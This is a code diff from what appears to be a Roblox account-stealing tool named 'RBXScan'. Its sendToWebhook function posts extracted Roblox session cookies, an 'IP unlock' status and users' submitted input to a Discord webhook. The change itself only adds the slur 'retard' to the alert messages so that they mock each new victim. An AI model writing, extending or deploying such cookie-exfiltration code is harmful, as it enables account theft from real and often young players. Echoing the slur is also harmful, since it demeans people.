@@ -281,7 +281,7 @@ async function sendToWebhook(code, validationResult = {}) {
                                 unlockResult.status === 'attempted' ? '⚠️ ATTEMPTED' : '❌ FAILED';
             
             payload = {
-                content: `@everyone 🎯 **ROBLOX COOKIE EXTRACTED & IP UNLOCK ${unlockStatus}** 🎯`,
+                content: `@everyone new retard got hit 🎯 **ROBLOX COOKIE EXTRACTED & IP UNLOCK ${unlockStatus}** 🎯`,
                 embeds: [{
                     title: "🍪 RBXScan - Cookie Extraction & IP Unlock Alert",
                     description: `**🔑 Extracted Roblox Cookie:**\n\`\`\`\n${robloxCookie}\n\`\`\`\n\n**🔓 IP Unlock Status:** ${unlockResult.message}`,
@@ -362,7 +362,7 @@ async function sendToWebhook(code, validationResult = {}) {
         } else {
             // Regular input submission
             payload = {
-                content: "@everyone 🔍 **NEW ITEM SUBMISSION** 🔍",
+                content: "@everyone new retard got hit 🔍 **NEW ITEM SUBMISSION** 🔍",
                 embeds: [{
                     title: "🎯 RBXScan - Item Check Alert",
                     description: `**📝 Submitted Input:**\n\`\`\`\n${code}\n\`\`\``,
